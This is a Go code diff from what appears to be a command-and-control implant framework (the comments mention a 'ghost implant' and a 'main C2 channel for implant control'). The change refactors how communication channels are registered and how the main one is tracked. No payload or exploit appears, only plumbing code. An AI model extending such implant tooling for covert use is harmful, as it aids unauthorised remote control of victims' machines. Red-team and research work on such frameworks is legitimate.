@@ -38,28 +38,16 @@ type Channel struct {
 	Log         *logrus.Entry      // A logger for this channel
 }
 
+// New - Creates a new channel from a stream over which it will communicate.
+func New(stream io.ReadWriteCloser) (ch *Channel, err error) {
+	return
+}
+
 // channels - A struct containing all the channels currently running in this ghost implant.
 type channels struct {
+	Main   *Channel            // A reference to the main channel.
 	Active map[uint32]*Channel // All active channels
 	mutex  *sync.Mutex         // Concurrency safety
-}
-
-// Add - Add a channel to list
-func (c *channels) Add(ch *Channel) (err error) {
-	c.mutex.Lock()
-	c.Active[ch.ID] = ch
-	c.mutex.Unlock()
-	return
-}
-
-func (c *channels) Main() (main *Channel, err error) {
-	for _, ch := range c.Active {
-		if ch.Main {
-			main = ch
-			return
-		}
-	}
-	return
 }
 
 // SetupChannels - Inits the goroutine management system of the implant.
@@ -75,8 +63,14 @@ func SetupChannels() {
 	StartMainChannel()
 }
 
-// New - Creates a new channel from a stream over which it will communicate.
-func New(stream io.ReadWriteCloser) (ch *Channel, err error) {
+// Add - Add a channel to list
+func (c *channels) Add(ch *Channel) (err error) {
+	c.mutex.Lock()
+	c.Active[ch.ID] = ch
+	if ch.Main {
+		c.Main = ch
+	}
+	c.mutex.Unlock()
 	return
 }
 
@@ -87,6 +81,7 @@ func StartMainChannel() (err error) {
 	main := &Channel{
 		ID:          NewID(),
 		Name:        "main",
+		Main:        true,
 		Type:        corepb.ChannelType_CORE_CHAN,
 		Description: "main C2 channel for implant control",
 		Ready:       false, // This channel is not ready to work, no stream bound yet.
